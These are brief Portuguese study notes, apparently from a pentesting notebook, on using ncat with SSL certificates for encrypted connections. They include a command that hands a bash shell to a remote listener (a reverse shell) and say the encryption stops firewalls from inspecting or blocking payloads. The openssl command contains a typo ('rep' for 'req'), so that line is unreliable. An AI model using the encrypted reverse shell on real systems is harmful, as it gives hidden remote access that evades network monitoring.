É uma evolução do netcat

Com o ncat é possivel criar um certificado e uma chave para estabelecer uma conexão encriptada. 

Criar certificado e chave:
	`openssl rep -x509 -newkey rsa:2048 -keyout chave.pem -out cert.pem -days 10`

Abrir comunicação na porta 8443 com o ncat usando o certificado
	`ncat -vnlp 8443 --ssl-key chave.pem --ssl-cert cert.pem`
Permitindo conexão de somente um IP especifico:
	`ncat -vnlp 8443 --ssl-key chave.pem --ssl-cert cert.pem --allow 192.168.0.2`

Conectando na porta:
	`ncat -vn 192.168.1.2 8443 --ssl`
Conectando a porta mandando o bash
		`ncat -vn 192.168.1.2 8443 --ssl -e /bin/bash`

Dessa forma ele estabelece uma conexão encriptada, é interessante pois dificulta para o firewall conseguir entender oque está sendo comunicado na rede e ao enviar um payload o firewall não consegue identificar oque está sendo trafegado logo não sabe se é pra bloquear ou não.

## NCAT X NETCAT

O ncat permite usar criptografia
O ncat permite especificar qual endereço IP pode estabelecer conexão com o "--allow ip"